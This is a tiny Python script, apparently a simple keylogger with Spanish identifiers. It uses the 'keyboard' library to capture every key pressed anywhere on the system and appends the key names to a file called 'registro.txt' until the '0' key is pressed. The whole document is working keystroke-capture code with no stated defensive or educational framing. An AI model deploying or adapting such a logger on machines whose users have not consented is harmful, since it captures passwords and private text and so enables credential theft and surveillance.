import keyboard

fin = '0'

def grabar(tecla):
    with open("registro.txt", "a") as f:
        f.write(f"{tecla.name} ")



keyboard.on_press(grabar)
keyboard.wait(fin)

